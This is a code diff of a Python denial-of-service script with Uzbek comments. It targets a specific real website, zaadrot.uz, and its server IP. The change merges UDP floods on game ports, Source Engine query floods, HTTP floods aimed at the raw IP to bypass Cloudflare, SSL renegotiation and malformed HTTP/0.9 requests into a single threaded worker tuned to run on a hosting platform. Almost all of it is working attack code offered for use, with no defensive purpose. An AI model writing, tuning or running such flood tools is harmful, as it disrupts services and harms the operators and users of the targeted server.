@@ -322,118 +322,77 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-TARGET_IP = "84.54.82.227"          # zaadrot.uz server IP
-HTTP_PORT = 80
-HTTPS_PORT = 443
-GAME_PORTS = list(range(27015, 27031))  # 27015-27030
+TARGET_IP = "84.54.82.227"
+GAME_PORTS = list(range(27015, 27031))
 
-# === KONFIGURATSIYA ===
-UDP_THREADS = 1200      # UDP flood
-HTTP_THREADS = 500      # To'g'ridan-to'g'ri HTTP
-QUERY_THREADS = 400     # CS2 query
-SSL_THREADS = 200       # SSL renegotiation
+# === KAM THREAD, KO'P ISH ===
+TOTAL_THREADS = 150   # Railway safe limit
 
 print("=" * 60)
-print("[*] ZAADROT.UZ - 505 XATOSI BILAN QOTIRISH")
+print("[*] ZAADROT.UZ - OPTIMALLASHTIRILGAN HUJUM")
 print(f"[*] IP: {TARGET_IP}")
-print(f"[*] Jami threadlar: {UDP_THREADS + HTTP_THREADS + QUERY_THREADS + SSL_THREADS}")
-print("[*] Taxminiy vaqt: 2-3 daqiqa")
+print(f"[*] Threadlar: {TOTAL_THREADS} (xavfsiz)")
+print("[*] Taxminiy vaqt: 3-5 daqiqa")
 print("[*] Press Ctrl+C to stop")
 print("=" * 60)
 
-# === 1. UDP FLOOD (o'yin serverlariga) ===
-def udp_flood():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = b"\xff\xff\xff\xff" + b"X" * 1400
-    while True:
-        port = random.choice(GAME_PORTS)
-        sock.sendto(data, (TARGET_IP, port))
-
-# === 2. CS2 QUERY FLOOD (CPU yuklash) ===
-def query_flood():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    query = b"\xff\xff\xff\xffTSource Engine Query\x00"
-    while True:
-        port = random.choice(GAME_PORTS)
-        sock.sendto(query, (TARGET_IP, port))
-
-# === 3. TO'G'RIDAN-TO'G'RI HTTP FLOOD (Cloudflare bypass) ===
-def http_flood():
+# === HAR BIR THREAD HAMMA USULLARNI BAJARADI ===
+def worker():
+    # Har bir thread o'z socket va sessionlarini yaratadi
+    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     session = requests.Session()
-    headers = {
-        "Host": "zaadrot.uz",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "*/*",
-        "Connection": "close"
-    }
+    
+    udp_data = b"\xff\xff\xff\xff" + b"X" * 1400
+    query_data = b"\xff\xff\xff\xffTSource Engine Query\x00"
+    
     while True:
+        # 1. UDP flood (o'yin serverlari)
+        for _ in range(10):
+            port = random.choice(GAME_PORTS)
+            udp_sock.sendto(udp_data, (TARGET_IP, port))
+            udp_sock.sendto(query_data, (TARGET_IP, port))
+        
+        # 2. HTTP flood (to'g'ridan-to'g'ri IP)
         try:
-            # GET so'rovlari
-            session.get(f"http://{TARGET_IP}/", headers=headers, timeout=0.3, verify=False)
-            session.get(f"http://{TARGET_IP}/api/", headers=headers, timeout=0.3, verify=False)
-            # POST so'rovlari (katta body)
-            session.post(f"http://{TARGET_IP}/", headers=headers, data={"x": "y"*3000}, timeout=0.3, verify=False)
-            # HTTPS orqali
-            session.get(f"https://{TARGET_IP}/", headers=headers, timeout=0.3, verify=False)
+            session.get(f"http://{TARGET_IP}/", headers={"Host": "zaadrot.uz"}, timeout=0.3, verify=False)
+            session.post(f"http://{TARGET_IP}/", headers={"Host": "zaadrot.uz"}, data={"x": "y"*2000}, timeout=0.3, verify=False)
+            session.get(f"https://{TARGET_IP}/", headers={"Host": "zaadrot.uz"}, timeout=0.3, verify=False)
         except:
             pass
-
-# === 4. SSL RENEGOTIATION (TLS handshake) ===
-def ssl_reneg():
-    while True:
+        
+        # 3. SSL renegotiation
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
-            sock.connect((TARGET_IP, HTTPS_PORT))
+            sock.connect((TARGET_IP, 443))
             ctx = ssl.create_default_context()
             ssl_sock = ctx.wrap_socket(sock, server_hostname="zaadrot.uz")
-            for _ in range(20):
+            for _ in range(10):
                 ssl_sock.do_handshake()
             ssl_sock.close()
         except:
             pass
-
-# === 5. 505 XATOSI UCHUN MAXSUS SO'ROV ===
-def http_505():
-    session = requests.Session()
-    while True:
+        
+        # 4. HTTP/0.9 (505 uchun)
         try:
-            # HTTP/0.9 yoki noto'g'ri versiya so'rovi
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            sock.connect((TARGET_IP, HTTP_PORT))
-            sock.send(b"GET / HTTP/0.9\r\n\r\n")  # HTTP versiyasi noto'g'ri
-            sock.close()
-            
-            # HEAD so'rovi
-            session.head(f"http://{TARGET_IP}/", headers={"Host": "zaadrot.uz"}, timeout=0.3, verify=False)
+            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock2.settimeout(1)
+            sock2.connect((TARGET_IP, 80))
+            sock2.send(b"GET / HTTP/0.9\r\n\r\n")
+            sock2.close()
         except:
             pass
 
-# === Threadlarni ishga tushirish ===
+# === THREADLARNI ISHGA TUSHIRISH ===
 threads = []
-for _ in range(UDP_THREADS):
-    t = threading.Thread(target=udp_flood, daemon=True)
+for _ in range(TOTAL_THREADS):
+    t = threading.Thread(target=worker, daemon=True)
     t.start()
     threads.append(t)
-for _ in range(HTTP_THREADS):
-    t = threading.Thread(target=http_flood, daemon=True)
-    t.start()
-    threads.append(t)
-for _ in range(QUERY_THREADS):
-    t = threading.Thread(target=query_flood, daemon=True)
-    t.start()
-    threads.append(t)
-for _ in range(SSL_THREADS):
-    t = threading.Thread(target=ssl_reneg, daemon=True)
-    t.start()
-    threads.append(t)
-for _ in range(50):  # 505 xatosi uchun
-    t = threading.Thread(target=http_505, daemon=True)
-    t.start()
-    threads.append(t)
+    time.sleep(0.05)  # Tizimga yuklanish uchun pauza
 
-print("[*] Barcha threadlar ishga tushdi. 2-3 daqiqa kuting...")
+print("[*] Barcha threadlar ishga tushdi. 3-5 daqiqa kuting...")
 
 try:
     while True:
